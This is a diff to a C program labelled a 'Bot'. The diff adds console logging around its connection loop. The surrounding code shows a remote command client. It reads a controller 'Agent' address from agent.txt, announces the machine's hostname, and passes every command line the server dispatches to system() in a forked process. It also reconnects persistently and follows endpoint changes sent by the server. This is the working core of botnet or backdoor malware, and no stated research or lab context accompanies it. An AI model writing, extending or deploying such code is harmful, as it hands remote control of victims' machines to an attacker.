@@ -97,13 +97,25 @@ static int fetch_agent_endpoint(char *out_host, int max_host_len, int *out_port)
 
 int main(int argc, char **argv)
 {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
     char current_host[128] = "127.0.0.1";
     int current_port = 1338;
 
     signal(SIGPIPE, SIG_IGN);
     gethostname(idbuf, sizeof(idbuf) - 1);
 
-    fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
+    printf("[+] Bot initialized (Hostname: %s)\n", idbuf);
+
+    if (fetch_agent_endpoint(current_host, sizeof(current_host), &current_port))
+    {
+        printf("[+] Target Agent endpoint: %s:%d\n", current_host, current_port);
+    }
+    else
+    {
+        printf("[!] Failed to read agent.txt, using default %s:%d\n", current_host, current_port);
+    }
 
     time_t last_check = time(NULL);
 
@@ -112,6 +124,7 @@ int main(int argc, char **argv)
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock < 0)
         {
+            printf("[-] Failed to create socket: %s\n", strerror(errno));
             sleep(3);
             continue;
         }
@@ -126,6 +139,7 @@ int main(int argc, char **argv)
             struct hostent *h = gethostbyname(current_host);
             if (!h)
             {
+                printf("[-] DNS lookup failed for %s, retrying in 3s...\n", current_host);
                 close(sock);
                 fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
                 sleep(3);
@@ -134,13 +148,18 @@ int main(int argc, char **argv)
             memcpy(&sa.sin_addr, h->h_addr, h->h_length);
         }
 
+        printf("[*] Connecting to Agent (%s:%d)...\n", current_host, current_port);
+
         if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
         {
+            printf("[-] Connection to %s:%d failed (%s). Retrying in 3s...\n", current_host, current_port, strerror(errno));
             close(sock);
             fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
             sleep(3);
             continue;
         }
+
+        printf("[+] Connected to Agent (%s:%d)! Handshaking...\n", current_host, current_port);
 
         char buf[256];
         snprintf(buf, sizeof(buf), "HELLO %s\n", idbuf);
@@ -154,6 +173,7 @@ int main(int argc, char **argv)
         {
             if (pfd.revents & (POLLERR | POLLHUP | POLLNVAL))
             {
+                printf("[-] Connection poll error or hung up.\n");
                 break;
             }
 
@@ -162,6 +182,7 @@ int main(int argc, char **argv)
                 int n = read(sock, buf, sizeof(buf) - 1);
                 if (n <= 0)
                 {
+                    printf("[-] Server closed connection.\n");
                     break;
                 }
                 buf[n] = 0;
@@ -172,6 +193,7 @@ int main(int argc, char **argv)
                 {
                     if (strncmp(line, "PONG", 4) != 0 && strncmp(line, "SSH-", 4) != 0 && strlen(line) > 0)
                     {
+                        printf("[+] Executing dispatched command: %s\n", line);
                         if (fork() == 0)
                         {
                             system(line);
@@ -196,6 +218,7 @@ int main(int argc, char **argv)
                 {
                     if (strcmp(new_host, current_host) != 0 || new_port != current_port)
                     {
+                        printf("[*] Endpoint updated to %s:%d, reconnecting...\n", new_host, new_port);
                         strncpy(current_host, new_host, sizeof(current_host) - 1);
                         current_port = new_port;
                         break;
